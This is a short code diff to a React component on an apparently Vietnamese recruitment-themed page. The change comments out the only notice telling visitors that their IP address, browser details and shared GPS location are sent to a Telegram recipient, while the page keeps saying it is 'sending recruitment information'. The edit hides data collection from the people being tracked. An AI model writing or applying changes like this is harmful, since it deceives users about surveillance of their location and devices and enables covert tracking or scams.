@@ -32,10 +32,10 @@ export default function LocationNotifier({ event }: { event: LocationEvent }) {
   }, [token, event]);
   return (
     <div className="location-notifier" aria-live="polite">
-      <p className="micro">
+      {/* <p className="micro">
         Thông tin truy cập gồm IP và trình duyệt được gửi đến bộ phận tiếp nhận qua Telegram.
         {event.position && ' Kèm vị trí GPS đã được trình duyệt cho phép chia sẻ.'}
-      </p>
+      </p> */}
       {status === 'waiting' && <Turnstile action="location" onToken={setToken} resetKey={reset} />}
       <p className="micro">{status === 'sending' ? 'Đang gửi thông tin tuyển dụng…' : message}</p>
       {status === 'error' && (
